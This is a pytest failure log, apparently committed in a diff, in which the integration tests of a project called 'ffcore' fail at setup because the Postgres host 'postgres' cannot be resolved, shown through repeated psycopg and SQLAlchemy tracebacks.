+    self._dbapi_connection = engine.raw_connection()
+                             ^^^^^^^^^^^^^^^^^^^^^^^
+/opt/venv/lib/python3.12/site-packages/sqlalchemy/engine/base.py:3299: in raw_connection
+    return self.pool.connect()
+           ^^^^^^^^^^^^^^^^^^^
+/opt/venv/lib/python3.12/site-packages/sqlalchemy/pool/base.py:445: in connect
+    return _ConnectionFairy._checkout(self)
+           ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
+/opt/venv/lib/python3.12/site-packages/sqlalchemy/pool/base.py:1324: in _checkout
+    fairy = _ConnectionRecord.checkout(pool)
+            ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
+/opt/venv/lib/python3.12/site-packages/sqlalchemy/pool/base.py:709: in checkout
+    rec = pool._do_get()
+          ^^^^^^^^^^^^^^
+/opt/venv/lib/python3.12/site-packages/sqlalchemy/pool/impl.py:301: in _do_get
+    return self._create_connection()
+           ^^^^^^^^^^^^^^^^^^^^^^^^^
+/opt/venv/lib/python3.12/site-packages/sqlalchemy/pool/base.py:386: in _create_connection
+    return _ConnectionRecord(self)
+           ^^^^^^^^^^^^^^^^^^^^^^^
+/opt/venv/lib/python3.12/site-packages/sqlalchemy/pool/base.py:671: in __init__
+    self.__connect()
+/opt/venv/lib/python3.12/site-packages/sqlalchemy/pool/base.py:916: in __connect
+    with util.safe_reraise():
+         ^^^^^^^^^^^^^^^^^^^
+/opt/venv/lib/python3.12/site-packages/sqlalchemy/util/langhelpers.py:166: in __exit__
+    raise exc_value.with_traceback(exc_tb)
+/opt/venv/lib/python3.12/site-packages/sqlalchemy/pool/base.py:912: in __connect
+    self.dbapi_connection = connection = pool._invoke_creator(self)
+                                         ^^^^^^^^^^^^^^^^^^^^^^^^^^
+/opt/venv/lib/python3.12/site-packages/sqlalchemy/engine/create.py:645: in connect
+    return dialect.connect(*cargs_tup, **cparams)
+           ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
+/opt/venv/lib/python3.12/site-packages/sqlalchemy/engine/default.py:869: in connect
+    return self.loaded_dbapi.connect(*cargs, **cparams)  # type: ignore[no-any-return]  # NOQA: E501
+           ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
+/opt/venv/lib/python3.12/site-packages/sqlalchemy/dialects/postgresql/psycopg.py:760: in connect
+    return await_(
+/opt/venv/lib/python3.12/site-packages/sqlalchemy/util/concurrency.py:167: in await_
+    return current.parent.switch(awaitable)  # type: ignore[no-any-return]
+           ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
+/opt/venv/lib/python3.12/site-packages/sqlalchemy/util/concurrency.py:205: in greenlet_spawn
+    value = await result
+            ^^^^^^^^^^^^
+/opt/venv/lib/python3.12/site-packages/sqlalchemy/connectors/asyncio.py:378: in create
+    cls._handle_exception_no_connection(dbapi, error)
+/opt/venv/lib/python3.12/site-packages/sqlalchemy/connectors/asyncio.py:409: in _handle_exception_no_connection
+    raise error.with_traceback(exc_info[2])
+/opt/venv/lib/python3.12/site-packages/sqlalchemy/connectors/asyncio.py:376: in create
+    connection = await connection_awaitable
+                 ^^^^^^^^^^^^^^^^^^^^^^^^^^
+/opt/venv/lib/python3.12/site-packages/psycopg/connection_async.py:116: in connect
+    attempts = await conninfo_attempts_async(params)
+               ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
+_ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ 
+
+params = {'host': 'postgres', 'dbname': 'ffcore_test_810981bcb86c', 'user': 'ffcore', 'password': 'dummy-not-secret-postgres', ...}
+
+    async def conninfo_attempts_async(params: ConnMapping) -> list[ConnDict]:
+        """Split a set of connection params on the single attempts to perform.
+    
+        A connection param can perform more than one attempt more than one ``host``
+        is provided.
+    
+        Also perform async resolution of the hostname into hostaddr. Because a host
+        can resolve to more than one address, this can lead to yield more attempts
+        too. Raise `OperationalError` if no host could be resolved.
+    
+        Because the libpq async function doesn't honour the timeout, we need to
+        reimplement the repeated attempts.
+        """
+        last_exc = None
+        attempts = []
+        if prefer_standby := get_param(params, "target_session_attrs") == "prefer-standby":
+            params = {k: v for k, v in params.items() if k != "target_session_attrs"}
+    
+        for attempt in split_attempts(params):
+            try:
+                attempts.extend(await _resolve_hostnames(attempt))
+            except OSError as ex:
+                last_exc = e.OperationalError(
+                    f"failed to resolve host {attempt.get('host')!r}: {ex}"
+                )
+                logger.debug("%s", last_exc)
+    
+        if not attempts:
+            assert last_exc
+            # We couldn't resolve anything
+>           raise last_exc
+E           sqlalchemy.exc.OperationalError: (psycopg.OperationalError) failed to resolve host 'postgres': [Errno -3] Temporary failure in name resolution
+E           (Background on this error at: https://sqlalche.me/e/21/e3q8)
+
+/opt/venv/lib/python3.12/site-packages/psycopg/_conninfo_attempts_async.py:53: OperationalError
+___ ERROR at setup of test_134_llmaas_every_message_tokenized_and_idempotent ___
+
+database_url = 'postgresql+psycopg://ffcore:dummy-not-secret-postgres@postgres:5432/ffcore_test_810981bcb86c'
+
+    @pytest.fixture
+    def pg(database_url):
+        plain = make_url(database_url).set(drivername="postgresql")
+>       with psycopg.connect(plain.render_as_string(hide_password=False), autocommit=True) as conn:
+             ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
+
+tests/integration/conftest.py:100: 
+_ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ 
+/opt/venv/lib/python3.12/site-packages/psycopg/connection.py:100: in connect
+    attempts = conninfo_attempts(params)
+               ^^^^^^^^^^^^^^^^^^^^^^^^^
+_ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ 
+
+params = {'user': 'ffcore', 'password': 'dummy-not-secret-postgres', 'dbname': 'ffcore_test_810981bcb86c', 'host': 'postgres', ...}
+
+    def conninfo_attempts(params: ConnMapping) -> list[ConnDict]:
+        """Split a set of connection params on the single attempts to perform.
+    
+        A connection param can perform more than one attempt more than one ``host``
+        is provided.
+    
+        Also perform async resolution of the hostname into hostaddr. Because a host
+        can resolve to more than one address, this can lead to yield more attempts
+        too. Raise `OperationalError` if no host could be resolved.
+    
+        Because the libpq async function doesn't honour the timeout, we need to
+        reimplement the repeated attempts.
+        """
+        last_exc = None
+        attempts = []
+        if prefer_standby := (
+            get_param(params, "target_session_attrs") == "prefer-standby"
+        ):
+            params = {k: v for k, v in params.items() if k != "target_session_attrs"}
+    
+        for attempt in split_attempts(params):
+            try:
+                attempts.extend(_resolve_hostnames(attempt))
+            except OSError as ex:
+                last_exc = e.OperationalError(
+                    f"failed to resolve host {attempt.get('host')!r}: {ex}"
+                )
+                logger.debug("%s", last_exc)
+    
+        if not attempts:
+            assert last_exc
+            # We couldn't resolve anything
+>           raise last_exc
+E           psycopg.OperationalError: failed to resolve host 'postgres': [Errno -3] Temporary failure in name resolution
+
+/opt/venv/lib/python3.12/site-packages/psycopg/_conninfo_attempts.py:55: OperationalError
+___ ERROR at setup of test_18td_11_invoke_reaches_the_desk_without_identity ____
+
+database_url = 'postgresql+psycopg://ffcore:dummy-not-secret-postgres@postgres:5432/ffcore_test_810981bcb86c'
+
+    @pytest.fixture
+    def pg(database_url):
+        plain = make_url(database_url).set(drivername="postgresql")
+>       with psycopg.connect(plain.render_as_string(hide_password=False), autocommit=True) as conn:
+             ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
+
+tests/integration/conftest.py:100: 
+_ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ 
+/opt/venv/lib/python3.12/site-packages/psycopg/connection.py:100: in connect
+    attempts = conninfo_attempts(params)
+               ^^^^^^^^^^^^^^^^^^^^^^^^^
+_ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ 
+
+params = {'user': 'ffcore', 'password': 'dummy-not-secret-postgres', 'dbname': 'ffcore_test_810981bcb86c', 'host': 'postgres', ...}
+
+    def conninfo_attempts(params: ConnMapping) -> list[ConnDict]:
+        """Split a set of connection params on the single attempts to perform.
+    
+        A connection param can perform more than one attempt more than one ``host``
+        is provided.
+    
+        Also perform async resolution of the hostname into hostaddr. Because a host
+        can resolve to more than one address, this can lead to yield more attempts
+        too. Raise `OperationalError` if no host could be resolved.
+    
+        Because the libpq async function doesn't honour the timeout, we need to
+        reimplement the repeated attempts.
+        """
+        last_exc = None
+        attempts = []
+        if prefer_standby := (
+            get_param(params, "target_session_attrs") == "prefer-standby"
+        ):
+            params = {k: v for k, v in params.items() if k != "target_session_attrs"}
+    
+        for attempt in split_attempts(params):
+            try:
+                attempts.extend(_resolve_hostnames(attempt))
+            except OSError as ex:
+                last_exc = e.OperationalError(
+                    f"failed to resolve host {attempt.get('host')!r}: {ex}"
+                )
+                logger.debug("%s", last_exc)
+    
+        if not attempts:
+            assert last_exc
+            # We couldn't resolve anything
+>           raise last_exc
+E           psycopg.OperationalError: failed to resolve host 'postgres': [Errno -3] Temporary failure in name resolution
+
+/opt/venv/lib/python3.12/site-packages/psycopg/_conninfo_attempts.py:55: OperationalError
+________ ERROR at setup of test_19_1_ingest_raw_paycore_like_idempotent ________
+
+database_url = 'postgresql+psycopg://ffcore:dummy-not-secret-postgres@postgres:5432/ffcore_test_810981bcb86c'
+
+    @pytest.fixture
+    def pg(database_url):
+        plain = make_url(database_url).set(drivername="postgresql")
+>       with psycopg.connect(plain.render_as_string(hide_password=False), autocommit=True) as conn:
+             ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
+
+tests/integration/conftest.py:100: 
+_ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ 
+/opt/venv/lib/python3.12/site-packages/psycopg/connection.py:100: in connect
+    attempts = conninfo_attempts(params)
+               ^^^^^^^^^^^^^^^^^^^^^^^^^
+_ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ 
+
+params = {'user': 'ffcore', 'password': 'dummy-not-secret-postgres', 'dbname': 'ffcore_test_810981bcb86c', 'host': 'postgres', ...}
+
+    def conninfo_attempts(params: ConnMapping) -> list[ConnDict]:
+        """Split a set of connection params on the single attempts to perform.
+    
+        A connection param can perform more than one attempt more than one ``host``
+        is provided.
+    
+        Also perform async resolution of the hostname into hostaddr. Because a host
+        can resolve to more than one address, this can lead to yield more attempts
+        too. Raise `OperationalError` if no host could be resolved.
+    
+        Because the libpq async function doesn't honour the timeout, we need to
+        reimplement the repeated attempts.
+        """
+        last_exc = None
+        attempts = []
+        if prefer_standby := (
+            get_param(params, "target_session_attrs") == "prefer-standby"
+        ):
+            params = {k: v for k, v in params.items() if k != "target_session_attrs"}
+    
+        for attempt in split_attempts(params):
+            try:
+                attempts.extend(_resolve_hostnames(attempt))
+            except OSError as ex:
+                last_exc = e.OperationalError(
+                    f"failed to resolve host {attempt.get('host')!r}: {ex}"
+                )
+                logger.debug("%s", last_exc)
+    
+        if not attempts:
+            assert last_exc
+            # We couldn't resolve anything
+>           raise last_exc
+E           psycopg.OperationalError: failed to resolve host 'postgres': [Errno -3] Temporary failure in name resolution
+
+/opt/venv/lib/python3.12/site-packages/psycopg/_conninfo_attempts.py:55: OperationalError
+____ ERROR at setup of test_19_s1_pii_masked_in_silver_text_raw_and_chunks _____
+
+database_url = 'postgresql+psycopg://ffcore:dummy-not-secret-postgres@postgres:5432/ffcore_test_810981bcb86c'
+
+    @pytest.fixture
+    def pg(database_url):
+        plain = make_url(database_url).set(drivername="postgresql")
+>       with psycopg.connect(plain.render_as_string(hide_password=False), autocommit=True) as conn:
+             ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
+
+tests/integration/conftest.py:100: 
+_ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ 
+/opt/venv/lib/python3.12/site-packages/psycopg/connection.py:100: in connect
+    attempts = conninfo_attempts(params)
+               ^^^^^^^^^^^^^^^^^^^^^^^^^
+_ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ 
+
+params = {'user': 'ffcore', 'password': 'dummy-not-secret-postgres', 'dbname': 'ffcore_test_810981bcb86c', 'host': 'postgres', ...}
+
+    def conninfo_attempts(params: ConnMapping) -> list[ConnDict]:
+        """Split a set of connection params on the single attempts to perform.
+    
+        A connection param can perform more than one attempt more than one ``host``
+        is provided.
+    
+        Also perform async resolution of the hostname into hostaddr. Because a host
+        can resolve to more than one address, this can lead to yield more attempts
+        too. Raise `OperationalError` if no host could be resolved.
+    
+        Because the libpq async function doesn't honour the timeout, we need to
+        reimplement the repeated attempts.
+        """
+        last_exc = None
+        attempts = []
+        if prefer_standby := (
+            get_param(params, "target_session_attrs") == "prefer-standby"
+        ):
+            params = {k: v for k, v in params.items() if k != "target_session_attrs"}
+    
+        for attempt in split_attempts(params):
+            try:
+                attempts.extend(_resolve_hostnames(attempt))
+            except OSError as ex:
+                last_exc = e.OperationalError(
+                    f"failed to resolve host {attempt.get('host')!r}: {ex}"
+                )
+                logger.debug("%s", last_exc)
+    
+        if not attempts:
+            assert last_exc
+            # We couldn't resolve anything
+>           raise last_exc
+E           psycopg.OperationalError: failed to resolve host 'postgres': [Errno -3] Temporary failure in name resolution
+
+/opt/venv/lib/python3.12/site-packages/psycopg/_conninfo_attempts.py:55: OperationalError
+________________ ERROR at setup of test_19_1_limit_first_slice _________________
+
+self = <sqlalchemy.engine.base.Connection object at 0x7fec6072c830>
+engine = Engine(postgresql+psycopg://ffcore:***@postgres:5432/ffcore_test_810981bcb86c)
+connection = None, _has_events = None, _allow_revalidate = True
+_allow_autobegin = True
+
+    def __init__(
+        self,
+        engine: Engine,
+        connection: Optional[PoolProxiedConnection] = None,
+        _has_events: Optional[bool] = None,
+        _allow_revalidate: bool = True,
+        _allow_autobegin: bool = True,
+    ):
+        """Construct a new Connection."""
+        self.engine = engine
+        self.dialect = dialect = engine.dialect
+    
+        if connection is None:
+            try:
+>               self._dbapi_connection = engine.raw_connection()
+                                         ^^^^^^^^^^^^^^^^^^^^^^^
+
+/opt/venv/lib/python3.12/site-packages/sqlalchemy/engine/base.py:149: 
+_ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ 
+/opt/venv/lib/python3.12/site-packages/sqlalchemy/engine/base.py:3299: in raw_connection
+    return self.pool.connect()
+           ^^^^^^^^^^^^^^^^^^^
+/opt/venv/lib/python3.12/site-packages/sqlalchemy/pool/base.py:445: in connect
+    return _ConnectionFairy._checkout(self)
+           ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
+/opt/venv/lib/python3.12/site-packages/sqlalchemy/pool/base.py:1324: in _checkout
+    fairy = _ConnectionRecord.checkout(pool)
+            ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
+/opt/venv/lib/python3.12/site-packages/sqlalchemy/pool/base.py:709: in checkout
+    rec = pool._do_get()
+          ^^^^^^^^^^^^^^
+/opt/venv/lib/python3.12/site-packages/sqlalchemy/pool/impl.py:301: in _do_get
+    return self._create_connection()
+           ^^^^^^^^^^^^^^^^^^^^^^^^^
+/opt/venv/lib/python3.12/site-packages/sqlalchemy/pool/base.py:386: in _create_connection
+    return _ConnectionRecord(self)
+           ^^^^^^^^^^^^^^^^^^^^^^^
+/opt/venv/lib/python3.12/site-packages/sqlalchemy/pool/base.py:671: in __init__
+    self.__connect()
+/opt/venv/lib/python3.12/site-packages/sqlalchemy/pool/base.py:916: in __connect
+    with util.safe_reraise():
+         ^^^^^^^^^^^^^^^^^^^
+/opt/venv/lib/python3.12/site-packages/sqlalchemy/util/langhelpers.py:166: in __exit__
+    raise exc_value.with_traceback(exc_tb)
+/opt/venv/lib/python3.12/site-packages/sqlalchemy/pool/base.py:912: in __connect
+    self.dbapi_connection = connection = pool._invoke_creator(self)
+                                         ^^^^^^^^^^^^^^^^^^^^^^^^^^
+/opt/venv/lib/python3.12/site-packages/sqlalchemy/engine/create.py:645: in connect
+    return dialect.connect(*cargs_tup, **cparams)
+           ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
+/opt/venv/lib/python3.12/site-packages/sqlalchemy/engine/default.py:869: in connect
+    return self.loaded_dbapi.connect(*cargs, **cparams)  # type: ignore[no-any-return]  # NOQA: E501
+           ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
+/opt/venv/lib/python3.12/site-packages/sqlalchemy/dialects/postgresql/psycopg.py:760: in connect
+    return await_(
+/opt/venv/lib/python3.12/site-packages/sqlalchemy/util/concurrency.py:167: in await_
+    return current.parent.switch(awaitable)  # type: ignore[no-any-return]
+           ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
+/opt/venv/lib/python3.12/site-packages/sqlalchemy/util/concurrency.py:205: in greenlet_spawn
+    value = await result
+            ^^^^^^^^^^^^
+/opt/venv/lib/python3.12/site-packages/sqlalchemy/connectors/asyncio.py:378: in create
+    cls._handle_exception_no_connection(dbapi, error)
+/opt/venv/lib/python3.12/site-packages/sqlalchemy/connectors/asyncio.py:409: in _handle_exception_no_connection
+    raise error.with_traceback(exc_info[2])
+/opt/venv/lib/python3.12/site-packages/sqlalchemy/connectors/asyncio.py:376: in create
+    connection = await connection_awaitable
+                 ^^^^^^^^^^^^^^^^^^^^^^^^^^
+/opt/venv/lib/python3.12/site-packages/psycopg/connection_async.py:116: in connect
+    attempts = await conninfo_attempts_async(params)
+               ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
+_ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ 
+
+params = {'host': 'postgres', 'dbname': 'ffcore_test_810981bcb86c', 'user': 'ffcore', 'password': 'dummy-not-secret-postgres', ...}
+
+    async def conninfo_attempts_async(params: ConnMapping) -> list[ConnDict]:
+        """Split a set of connection params on the single attempts to perform.
+    
+        A connection param can perform more than one attempt more than one ``host``
+        is provided.
+    
+        Also perform async resolution of the hostname into hostaddr. Because a host
+        can resolve to more than one address, this can lead to yield more attempts
+        too. Raise `OperationalError` if no host could be resolved.
+    
+        Because the libpq async function doesn't honour the timeout, we need to
+        reimplement the repeated attempts.
+        """
+        last_exc = None
+        attempts = []
+        if prefer_standby := get_param(params, "target_session_attrs") == "prefer-standby":
+            params = {k: v for k, v in params.items() if k != "target_session_attrs"}
+    
+        for attempt in split_attempts(params):
+            try:
+                attempts.extend(await _resolve_hostnames(attempt))
+            except OSError as ex:
+                last_exc = e.OperationalError(
+                    f"failed to resolve host {attempt.get('host')!r}: {ex}"
+                )
+                logger.debug("%s", last_exc)
+    
+        if not attempts:
+            assert last_exc
+            # We couldn't resolve anything
+>           raise last_exc
+E           psycopg.OperationalError: failed to resolve host 'postgres': [Errno -3] Temporary failure in name resolution
+
+/opt/venv/lib/python3.12/site-packages/psycopg/_conninfo_attempts_async.py:53: OperationalError
+
+The above exception was the direct cause of the following exception:
+
+make_user = <function make_user.<locals>.make at 0x7fec72589760>
+make_project = <function make_project.<locals>.make at 0x7fec7e5eb9c0>
+client_factory = <function client_factory.<locals>.make at 0x7fec64a93240>
+settings = Settings(deploy_profile='llmaas', inference_backend='ollama', offline=False, database_url=SecretStr('**********'), ser...flush_s=60, retention_dry_run=True, retention_audit_drop_enabled=False, retention_batch=5000, alert_service_down_s=300)
+queue = <tests.integration.test_04a_api.FakeQueue object at 0x7fec6916eb10>
+
+    @pytest.fixture
+    def world(make_user, make_project, client_factory, settings, queue):
+        project = make_project()
+        other = make_project()
+        admin_id, admin = make_user(memberships={project: ("admin", "edit")})
+        admin_read_id, admin_read = make_user(memberships={project: ("admin", "read")})
+        analyst_id, analyst = make_user(memberships={project: ("analyst", "edit")})
+        stranger_id, stranger = make_user(memberships={other: ("analyst", "edit")})
+        return {
+            "project": str(project),
+            "other": str(other),
+>           "admin": client_factory(admin),
+                     ^^^^^^^^^^^^^^^^^^^^^
+            "admin_read": client_factory(admin_read),
+            "analyst": client_factory(analyst),
+            "stranger": client_factory(stranger),
+            "service": client_factory(),
+            "analyst_id": analyst_id,
+            "admin_id": admin_id,
+        }
+
+tests/integration/test_04a_api.py:66: 
+_ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ 
+tests/integration/conftest.py:203: in make
+    client.__enter__()
+/opt/venv/lib/python3.12/site-packages/starlette/testclient.py:572: in __enter__
+    portal.call(self.wait_startup)
+/opt/venv/lib/python3.12/site-packages/anyio/from_thread.py:340: in call
+    return cast(T_Retval, self.start_task_soon(func, *args).result())
+                          ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
+/usr/local/lib/python3.12/concurrent/futures/_base.py:456: in result
+    return self.__get_result()
+           ^^^^^^^^^^^^^^^^^^^
+/usr/local/lib/python3.12/concurrent/futures/_base.py:401: in __get_result
+    raise self._exception
+/opt/venv/lib/python3.12/site-packages/anyio/from_thread.py:265: in _call_func
+    retval = await retval_or_awaitable
+             ^^^^^^^^^^^^^^^^^^^^^^^^^
+/opt/venv/lib/python3.12/site-packages/starlette/testclient.py:608: in wait_startup
+    await receive()
+/opt/venv/lib/python3.12/site-packages/starlette/testclient.py:599: in receive
+    self.task.result()
+/usr/local/lib/python3.12/concurrent/futures/_base.py:449: in result
+    return self.__get_result()
+           ^^^^^^^^^^^^^^^^^^^
+/usr/local/lib/python3.12/concurrent/futures/_base.py:401: in __get_result
+    raise self._exception
+/opt/venv/lib/python3.12/site-packages/anyio/from_thread.py:265: in _call_func
+    retval = await retval_or_awaitable
+             ^^^^^^^^^^^^^^^^^^^^^^^^^
+/opt/venv/lib/python3.12/site-packages/starlette/testclient.py:589: in lifespan
+    await self.app(scope, self.stream_receive.receive, self.stream_send.send)
+/opt/venv/lib/python3.12/site-packages/fastapi/applications.py:1181: in __call__
+    await lifespan(
+/opt/venv/lib/python3.12/site-packages/fastapi/telemetry/_runtime.py:238: in lifespan
+    await app(scope, wrapped_receive, wrapped_send)
+/opt/venv/lib/python3.12/site-packages/starlette/applications.py:96: in __call__
+    await self.middleware_stack(scope, receive, send)
+/opt/venv/lib/python3.12/site-packages/starlette/middleware/errors.py:151: in __call__
+    await self.app(scope, receive, send)
+/opt/venv/lib/python3.12/site-packages/fastapi/telemetry/_asgi.py:151: in __call__
+    await self.app(scope, receive, send)
+ffcore/core/logging.py:250: in __call__
+    await self.app(scope, receive, send)
+ffcore/api/upload_limit.py:44: in __call__
+    await self.app(scope, receive, send)
+/opt/venv/lib/python3.12/site-packages/starlette/middleware/exceptions.py:49: in __call__
+    await self.app(scope, receive, send)
+/opt/venv/lib/python3.12/site-packages/fastapi/middleware/asyncexitstack.py:18: in __call__
+    await self.app(scope, receive, send)
+/opt/venv/lib/python3.12/site-packages/starlette/routing.py:683: in __call__
+    await self.middleware_stack(scope, receive, send)
+/opt/venv/lib/python3.12/site-packages/fastapi/routing.py:2798: in app
+    await self.lifespan(scope, receive, send)
+/opt/venv/lib/python3.12/site-packages/starlette/routing.py:661: in lifespan
+    async with self.lifespan_context(app) as maybe_state:
+               ^^^^^^^^^^^^^^^^^^^^^^^^^^
+/usr/local/lib/python3.12/contextlib.py:210: in __aenter__
+    return await anext(self.gen)
+           ^^^^^^^^^^^^^^^^^^^^^
+/opt/venv/lib/python3.12/site-packages/fastapi/routing.py:248: in merged_lifespan
+    async with original_context(app) as maybe_original_state:
+               ^^^^^^^^^^^^^^^^^^^^^
+/usr/local/lib/python3.12/contextlib.py:210: in __aenter__
+    return await anext(self.gen)
+           ^^^^^^^^^^^^^^^^^^^^^
+/opt/venv/lib/python3.12/site-packages/fastapi/routing.py:248: in merged_lifespan
+    async with original_context(app) as maybe_original_state:
+               ^^^^^^^^^^^^^^^^^^^^^
+/usr/local/lib/python3.12/contextlib.py:210: in __aenter__
+    return await anext(self.gen)
+           ^^^^^^^^^^^^^^^^^^^^^
+/opt/venv/lib/python3.12/site-packages/fastapi/routing.py:248: in merged_lifespan
+    async with original_context(app) as maybe_original_state:
+               ^^^^^^^^^^^^^^^^^^^^^
+/usr/local/lib/python3.12/contextlib.py:210: in __aenter__
+    return await anext(self.gen)
+           ^^^^^^^^^^^^^^^^^^^^^
+/opt/venv/lib/python3.12/site-packages/fastapi/routing.py:248: in merged_lifespan
+    async with original_context(app) as maybe_original_state:
+               ^^^^^^^^^^^^^^^^^^^^^
+/usr/local/lib/python3.12/contextlib.py:210: in __aenter__
+    return await anext(self.gen)
+           ^^^^^^^^^^^^^^^^^^^^^
+/opt/venv/lib/python3.12/site-packages/fastapi/routing.py:248: in merged_lifespan
+    async with original_context(app) as maybe_original_state:
+               ^^^^^^^^^^^^^^^^^^^^^
+/usr/local/lib/python3.12/contextlib.py:210: in __aenter__
+    return await anext(self.gen)
+           ^^^^^^^^^^^^^^^^^^^^^
+ffcore/main.py:54: in lifespan
+    await ensure_audit_partitions(2)
+ffcore/core/audit.py:336: in ensure_audit_partitions
+    result = await session.execute(
+/opt/venv/lib/python3.12/site-packages/sqlalchemy/ext/asyncio/session.py:651: in execute
+    result = await greenlet_spawn(
+/opt/venv/lib/python3.12/site-packages/sqlalchemy/util/concurrency.py:210: in greenlet_spawn
+    result = context.throw(*sys.exc_info())
+             ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
+/opt/venv/lib/python3.12/site-packages/sqlalchemy/orm/session.py:2473: in execute
+    return self._execute_internal(
+/opt/venv/lib/python3.12/site-packages/sqlalchemy/orm/session.py:2350: in _execute_internal
+    conn = self._connection_for_bind(bind)
+           ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
+/opt/venv/lib/python3.12/site-packages/sqlalchemy/orm/session.py:2173: in _connection_for_bind
+    return trans._connection_for_bind(engine, execution_options)
+           ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
+/opt/venv/lib/python3.12/site-packages/sqlalchemy/orm/state_changes.py:137: in _go
+    ret_value = fn(self, *arg, **kw)
+                ^^^^^^^^^^^^^^^^^^^^
+/opt/venv/lib/python3.12/site-packages/sqlalchemy/orm/session.py:1203: in _connection_for_bind
+    conn = bind.connect()
+           ^^^^^^^^^^^^^^
+/opt/venv/lib/python3.12/site-packages/sqlalchemy/engine/base.py:3275: in connect
+    return self._connection_cls(self)
+           ^^^^^^^^^^^^^^^^^^^^^^^^^^
+/opt/venv/lib/python3.12/site-packages/sqlalchemy/engine/base.py:151: in __init__
+    Connection._handle_dbapi_exception_noconnection(
+/opt/venv/lib/python3.12/site-packages/sqlalchemy/engine/base.py:2432: in _handle_dbapi_exception_noconnection
+    raise sqlalchemy_exception.with_traceback(exc_info[2]) from e
+/opt/venv/lib/python3.12/site-packages/sqlalchemy/engine/base.py:149: in __init__
+    self._dbapi_connection = engine.raw_connection()
+                             ^^^^^^^^^^^^^^^^^^^^^^^
+/opt/venv/lib/python3.12/site-packages/sqlalchemy/engine/base.py:3299: in raw_connection
+    return self.pool.connect()
+           ^^^^^^^^^^^^^^^^^^^
+/opt/venv/lib/python3.12/site-packages/sqlalchemy/pool/base.py:445: in connect
+    return _ConnectionFairy._checkout(self)
+           ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
+/opt/venv/lib/python3.12/site-packages/sqlalchemy/pool/base.py:1324: in _checkout
+    fairy = _ConnectionRecord.checkout(pool)
+            ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
+/opt/venv/lib/python3.12/site-packages/sqlalchemy/pool/base.py:709: in checkout
+    rec = pool._do_get()
+          ^^^^^^^^^^^^^^
+/opt/venv/lib/python3.12/site-packages/sqlalchemy/pool/impl.py:301: in _do_get
+    return self._create_connection()
+           ^^^^^^^^^^^^^^^^^^^^^^^^^
+/opt/venv/lib/python3.12/site-packages/sqlalchemy/pool/base.py:386: in _create_connection
+    return _ConnectionRecord(self)
+           ^^^^^^^^^^^^^^^^^^^^^^^
+/opt/venv/lib/python3.12/site-packages/sqlalchemy/pool/base.py:671: in __init__
+    self.__connect()
+/opt/venv/lib/python3.12/site-packages/sqlalchemy/pool/base.py:916: in __connect
+    with util.safe_reraise():
+         ^^^^^^^^^^^^^^^^^^^
+/opt/venv/lib/python3.12/site-packages/sqlalchemy/util/langhelpers.py:166: in __exit__
+    raise exc_value.with_traceback(exc_tb)
+/opt/venv/lib/python3.12/site-packages/sqlalchemy/pool/base.py:912: in __connect
+    self.dbapi_connection = connection = pool._invoke_creator(self)
+                                         ^^^^^^^^^^^^^^^^^^^^^^^^^^
